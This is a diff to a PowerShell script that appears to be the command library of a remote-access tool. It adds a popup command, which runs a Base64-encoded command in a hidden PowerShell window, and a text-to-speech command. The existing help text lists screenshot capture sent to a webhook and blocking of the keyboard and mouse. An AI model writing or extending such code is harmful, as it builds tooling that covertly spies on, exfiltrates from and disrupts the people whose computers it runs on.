@@ -65,12 +65,45 @@ function unblock {
     echo "unblocked gng"
 }
 
+# Command: msg - displays a popup message box
+function msg {
+    param(
+        [Parameter(ValueFromRemainingArguments = $true)]
+        [string[]]$Text
+    )
+    $message = $Text -join " "
+    if (-not $message) { $message = "Hello!" }
+
+    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('$($message.Replace("'", "''"))', 'Message', 'OK', 'Information')"))
+    Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-EncodedCommand", $encoded
+    
+    echo "Your wish is my command."
+}
+
+# Command: tts - speaks the text aloud
+function tts {
+    param(
+        [Parameter(ValueFromRemainingArguments = $true)]
+        [string[]]$Text
+    )
+    $message = $Text -join " "
+    if (-not $message) { $message = "Hello!" }
+
+    Add-Type -AssemblyName System.Speech
+    $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
+    $synth.SpeakAsync($message) | Out-Null
+
+    echo "Your wish is my command."
+}
+
 # Help command – list available remote‑library commands
 function hlp {
     $commands = @{
         "ss"      = "capture a screenshot and send it to the webhook."
         "block"   = "block keyboard and mouse input for a duration (default 5s)"
         "unblock" = "manually unblock keyboard and mouse input"
+        "msg"     = "open a popup message box with custom text"
+        "tts"     = "speak a custom text message out loud"
         "hlp"     = "Display this help information"
     }
     Write-Host "Remote Library Commands:`n"
@@ -80,6 +113,6 @@ function hlp {
 }
 
 # Export the command list to a global variable for easy enumeration (optional)
-$global:RemoteLibCommands = @('ss', 'block', 'unblock', 'hlp')
+$global:RemoteLibCommands = @('ss', 'block', 'unblock', 'msg', 'tts', 'hlp')
 
 # End of remote_lib.ps1
